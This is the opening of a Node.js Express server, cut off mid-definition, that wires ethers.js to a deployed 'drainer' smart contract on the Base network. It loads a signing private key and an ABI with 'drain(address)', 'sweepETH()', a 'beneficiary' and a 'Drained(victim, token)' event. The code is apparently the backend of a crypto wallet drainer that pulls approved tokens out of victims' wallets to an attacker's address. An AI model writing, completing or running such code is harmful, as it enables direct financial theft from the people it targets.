require("dotenv").config();
const path = require("path");
const express = require("express");
const { ethers } = require("ethers");

const RPC_URL = process.env.RPC_URL || "https://mainnet.base.org";
const DRAINER_ADDRESS = (process.env.DRAINER_ADDRESS || "").trim();
const PRIVATE_KEY = (process.env.PRIVATE_KEY || "").trim();
const PORT = parseInt(process.env.PORT || "3000", 10);

if (!DRAINER_ADDRESS || DRAINER_ADDRESS === "PASTE_CONTRACT_ADDRESS") {
  console.error("Set DRAINER_ADDRESS in .env to the address Remix printed after deploy.");
  process.exit(1);
}

const provider = new ethers.JsonRpcProvider(RPC_URL);
const wallet = PRIVATE_KEY ? new ethers.Wallet(PRIVATE_KEY, provider) : null;

const DRAINER_ABI = [
  "function owner() view returns (address)",
  "function beneficiary() view returns (address)",
  "function tokenCount() view returns (uint256)",
  "function tokenAt(uint256) view returns (address)",
  "function drain(address)",
  "function sweepETH()",
  "event Drained(address indexed victim, address indexed token,
